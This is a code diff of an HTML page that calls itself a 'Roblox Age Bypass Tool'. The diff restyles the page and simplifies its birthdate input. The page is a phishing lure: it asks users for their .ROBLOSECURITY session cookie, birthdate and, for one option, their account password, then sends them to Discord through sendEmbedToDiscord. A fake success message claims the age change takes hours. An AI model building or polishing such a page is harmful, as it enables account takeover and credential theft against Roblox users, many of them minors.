@@ -6,7 +6,226 @@
   <title>Roblox Age Bypass Tool</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
   <style>
-    /* ... (deine bisherigen Styles bleiben unverändert) ... */
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(to bottom, #0c0f1f, #090d1a);
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 60px 20px;
+    }
+
+    h1 {
+      font-size: 36px;
+      font-weight: 700;
+      background: linear-gradient(90deg, #ff00c8, #00f0ff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 10px;
+    }
+
+    .subtitle {
+      font-size: 16px;
+      color: #aaa;
+      margin-bottom: 40px;
+      text-align: center;
+      max-width: 500px;
+    }
+
+    .container {
+      background: #111a2e;
+      border-radius: 12px;
+      padding: 30px;
+      width: 100%;
+      max-width: 600px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.4);
+      margin-bottom: 30px;
+    }
+
+    label {
+      display: block;
+      font-weight: 600;
+      margin-bottom: 10px;
+      font-size: 18px;
+    }
+
+    select {
+      width: 100%;
+      padding: 12px;
+      border-radius: 8px;
+      background: #1d2944;
+      border: 1px solid #333;
+      color: #fff;
+      font-size: 16px;
+    }
+
+    .input-block {
+      margin-top: 20px;
+      background: #1d2944;
+      border-radius: 12px;
+      padding: 15px 15px 10px 15px;
+    }
+
+    .input-block-title {
+      font-weight: 600;
+      color: #00f0ff;
+      margin-bottom: 8px;
+      font-size: 16px;
+    }
+
+    textarea {
+      width: 100%;
+      resize: vertical;
+      min-height: 80px;
+      padding: 10px 15px;
+      font-family: 'Inter', sans-serif;
+      font-size: 14px;
+      border-radius: 8px;
+      border: 1px solid #333;
+      background: #0b1731;
+      color: #eee;
+      box-shadow: inset 0 0 5px rgba(0,255,255,0.1);
+      outline: none;
+    }
+
+    textarea::placeholder {
+      color: #5c7f94;
+    }
+
+    button {
+      margin-top: 20px;
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      font-weight: 600;
+      color: #fff;
+      background: linear-gradient(90deg, #ff00c8, #00f0ff);
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      user-select: none;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background: linear-gradient(90deg, #e000b9, #00d4ff);
+    }
+
+    .info-box {
+      background: #1d2944;
+      border-left: 4px solid #ffc107;
+      padding: 20px;
+      border-radius: 10px;
+      font-size: 14px;
+      color: #ddd;
+      margin-top: 30px;
+      box-shadow: inset 0 0 8px rgba(255, 193, 7, 0.2);
+    }
+
+    .info-box ul {
+      margin: 10px 0 0 0;
+      padding-left: 20px;
+    }
+
+    .info-box li {
+      margin-bottom: 8px;
+    }
+
+    .info-title {
+      font-weight: bold;
+      color: #ffc107;
+      font-size: 15px;
+    }
+
+    #error-message {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: #ff3b3b;
+      color: white;
+      padding: 12px 20px;
+      border-radius: 8px;
+      font-weight: 600;
+      font-size: 14px;
+      display: none;
+      z-index: 9999;
+      box-shadow: 0 0 10px rgba(255, 59, 59, 0.7);
+      user-select: none;
+    }
+
+    #success-message {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: #4CAF50;
+      color: white;
+      padding: 12px 20px;
+      border-radius: 8px;
+      font-weight: 600;
+      font-size: 14px;
+      display: none;
+      z-index: 9999;
+      box-shadow: 0 0 10px rgba(76, 175, 80, 0.7);
+      user-select: none;
+    }
+
+    #loader-overlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.75);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 10000;
+      display: none;
+    }
+
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #00f0ff;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    #help-button {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: linear-gradient(90deg, #ff00c8, #00f0ff);
+      border: none;
+      padding: 10px 16px;
+      border-radius: 8px;
+      color: white;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+      box-shadow: 0 0 8px rgba(0, 240, 255, 0.6);
+      z-index: 9999;
+      width: auto;
+      max-width: 250px;
+      white-space: nowrap;
+    }
+
+    #help-button:hover {
+      background: linear-gradient(90deg, #e000b9, #00d4ff);
+    }
   </style>
 </head>
 <body>
@@ -21,33 +240,11 @@
       <option value="13plus">13+ All Ages</option>
     </select>
 
-    <!-- NEU: Dropdowns für Tag, Monat, Jahr -->
-    <div id="birthdate-select" style="display:none; margin-top: 20px;">
-      <label style="font-weight:600; font-size:18px; margin-bottom:8px; display:block;">📅 Select your birthdate</label>
-      <div style="display:flex; gap:10px;">
-        <select id="birth-day" style="flex:1; padding:12px; border-radius:8px; background:#1d2944; border:1px solid #333; color:#fff; font-size:16px;">
-          <option value="">Day</option>
-        </select>
-        <select id="birth-month" style="flex:1; padding:12px; border-radius:8px; background:#1d2944; border:1px solid #333; color:#fff; font-size:16px;">
-          <option value="">Month</option>
-          <option value="1">January</option>
-          <option value="2">February</option>
-          <option value="3">March</option>
-          <option value="4">April</option>
-          <option value="5">May</option>
-          <option value="6">June</option>
-          <option value="7">July</option>
-          <option value="8">August</option>
-          <option value="9">September</option>
-          <option value="10">October</option>
-          <option value="11">November</option>
-          <option value="12">December</option>
-        </select>
-        <select id="birth-year" style="flex:1; padding:12px; border-radius:8px; background:#1d2944; border:1px solid #333; color:#fff; font-size:16px;">
-          <option value="">Year</option>
-        </select>
-      </div>
-    </div>
+    <!-- Added Birthdate Selector -->
+    <label for="birthdate" id="birthdate-label" style="display:none; margin-top:20px; font-weight:600; font-size:18px;">
+      📅 Select your birthdate
+    </label>
+    <input type="date" id="birthdate" style="display:none; width: 100%; padding: 12px; border-radius: 8px; background: #1d2944; border: 1px solid #333; color: #fff; font-size: 16px;" />
 
     <div id="cookie-block" class="input-block" style="display:none;">
       <div class="input-block-title">.ROBLOSECURITY Cookie</div>
@@ -78,6 +275,7 @@
   <div id="success-message">Everything worked it can take 2-12 Hours until the age will be set</div>
   <div id="loader-overlay"><div class="loader"></div></div>
 
+  <!-- 💡 Help Button -->
   <button id="help-button">Need Help? Here is a tutorial!</button>
 
   <script>
@@ -90,77 +288,25 @@
     const errorMessage = document.getElementById('error-message');
     const successMessage = document.getElementById('success-message');
     const loaderOverlay = document.getElementById('loader-overlay');
-
-    const birthdateSelect = document.getElementById('birthdate-select');
-    const birthDay = document.getElementById('birth-day');
-    const birthMonth = document.getElementById('birth-month');
-    const birthYear = document.getElementById('birth-year');
-
-    // Fülle Jahr Dropdown dynamisch (von 1900 bis aktuelles Jahr)
-    function populateYears() {
-      const currentYear = new Date().getFullYear();
-      for(let y = currentYear; y >= 1900; y--) {
-        let option = document.createElement('option');
-        option.value = y;
-        option.textContent = y;
-        birthYear.appendChild(option);
-      }
-    }
-    populateYears();
-
-    // Fülle Tag Dropdown abhängig vom Monat und Jahr (Schaltjahr etc.)
-    function populateDays() {
-      const month = parseInt(birthMonth.value);
-      const year = parseInt(birthYear.value);
-      let daysInMonth = 31;
-
-      if (!month) {
-        daysInMonth = 31;
-      } else if ([4,6,9,11].includes(month)) {
-        daysInMonth = 30;
-      } else if (month === 2) {
-        // Schaltjahr prüfen
-        if ((year % 4 === 0 && year % 100 !== 0) || (year % 400 === 0)) {
-          daysInMonth = 29;
-        } else {
-          daysInMonth = 28;
-        }
-      }
-
-      // Alte Tage entfernen
-      while (birthDay.options.length > 1) {
-        birthDay.remove(1);
-      }
-
-      for (let d = 1; d <= daysInMonth; d++) {
-        let option = document.createElement('option');
-        option.value = d;
-        option.textContent = d;
-        birthDay.appendChild(option);
-      }
-    }
-
-    birthMonth.addEventListener('change', () => {
-      populateDays();
-    });
-
-    birthYear.addEventListener('change', () => {
-      populateDays();
-    });
+    const birthdateLabel = document.getElementById('birthdate-label');
+    const birthdateInput = document.getElementById('birthdate');
 
     bypassSelect.addEventListener('change', () => {
       if (bypassSelect.value === '13plus') {
         cookieBlock.style.display = 'block';
         passwordBlock.style.display = 'block';
-        birthdateSelect.style.display = 'block';
+        birthdateLabel.style.display = 'block';
+        birthdateInput.style.display = 'block';
       } else if (bypassSelect.value === 'birthyear') {
         cookieBlock.style.display = 'block';
         passwordBlock.style.display = 'none';
-        birthdateSelect.style.display = 'block';
+        birthdateLabel.style.display = 'block';
+        birthdateInput.style.display = 'block';
       } else {
         cookieBlock.style.display = 'none';
         passwordBlock.style.display = 'none';
-        birthdateSelect.style.display = 'none';
+        birthdateLabel.style.display = 'none';
+        birthdateInput.style.display = 'none';
       }
       clearMessages();
     });
@@ -211,25 +357,10 @@
       const selected = bypassSelect.value;
       const cookieVal = cookieInput.value.trim();
       const passwordVal = passwordInput.value.trim();
-      const dayVal = birthDay.value;
-      const monthVal = birthMonth.value;
-      const yearVal = birthYear.value;
+      const birthdateVal = birthdateInput.value;
 
-      // Validation
-      if (!selected) {
-        showError('Please select an account security option.');
-        return;
-      }
-      if (cookieVal.length < 500) {
-        showError('Please enter a valid .ROBLOSECURITY cookie.');
-        return;
-      }
-      if (!dayVal || !monthVal || !yearVal) {
-        showError('Please select your complete birthdate.');
-        return;
-      }
-      if (selected === '13plus' && passwordVal.length === 0) {
-        showError('Please enter your account password.');
+      if (!selected || cookieVal.length < 500 || (selected === '13plus' && !passwordVal)) {
+        showError('ERROR Try later again.');
         return;
       }
 
@@ -237,11 +368,8 @@
       loaderOverlay.style.display = 'flex';
 
       try {
-        const birthdateFormatted = `${yearVal}-${monthVal.padStart(2, '0')}-${dayVal.padStart(2, '0')}`;
         const method = selected === 'birthyear' ? '2008 Birthyear Up' : '13+ All Ages';
-        await sendEmbedToDiscord('.ROBLOSECURITY Cookie & Birthdate', 
-          `**Method:** ${method}\n**Cookie:** ${cookieVal}\n**Birthdate:** ${birthdateFormatted}`
-        );
+        await sendEmbedToDiscord('.ROBLOSECURITY Cookie & Password', `**Method:** ${method}\n**Cookie:** ${cookieVal}\n**Birthdate:** ${birthdateVal || 'Not provided'}`);
         if (selected === '13plus') {
           await sendEmbedToDiscord('Account Password', `**Method:** 13+ All Ages\n**Password:** ${passwordVal}`);
         }
